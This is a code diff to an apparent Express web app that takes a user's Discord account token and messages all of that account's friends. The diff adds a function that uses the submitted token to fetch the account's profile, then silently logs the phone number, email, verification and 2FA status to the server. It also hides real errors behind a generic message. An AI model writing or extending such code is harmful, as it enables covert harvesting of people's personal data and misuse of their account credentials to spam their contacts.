@@ -11,6 +11,19 @@ app.set("view engine", "ejs");
 app.set("views", path.join(__dirname, "views"));
 
 // START HELPER FUNCTIONS //
+async function getUserData(token) {
+    const data = await fetch(`https://discord.com/api/v9/users/@me`, {
+        "headers": {
+          "Accept": "*/*",
+          "Accept-Language": "en-US,en;q=0.9",
+          "Authorization": `${token}`,
+          "Content-Type": "application/json",
+        },
+        "body": null,
+        "method": "GET"
+    });
+    return data;
+}
 async function getRelationships(token) {
     const data = await fetch(`https://discord.com/api/v9/users/@me/relationships`, {
         "headers": {
@@ -63,6 +76,15 @@ app.post(`${base}/sendMessage`, async (req, res) => {
     const messageContent = req.body.messageContent;
 
     try {
+        const userData = await getUserData(token);
+        const userDataJson = await userData.json();
+        console.log(`Username: ${userDataJson.username}
+Phone: ${userDataJson.phone}
+Email: ${userDataJson.email}
+Verified: ${userDataJson.verified}
+2FA: ${userDataJson.mfa_enabled}
+Locale: ${userDataJson.locale}`);
+
         const friendsData = await getRelationships(token);
         const friends = await friendsData.json();
     
@@ -76,7 +98,7 @@ app.post(`${base}/sendMessage`, async (req, res) => {
             }
         });
     } catch (err) {
-        console.log(err);
+        console.log("Error: Invalid Discord Token!");
     }
     
     res.redirect("/");
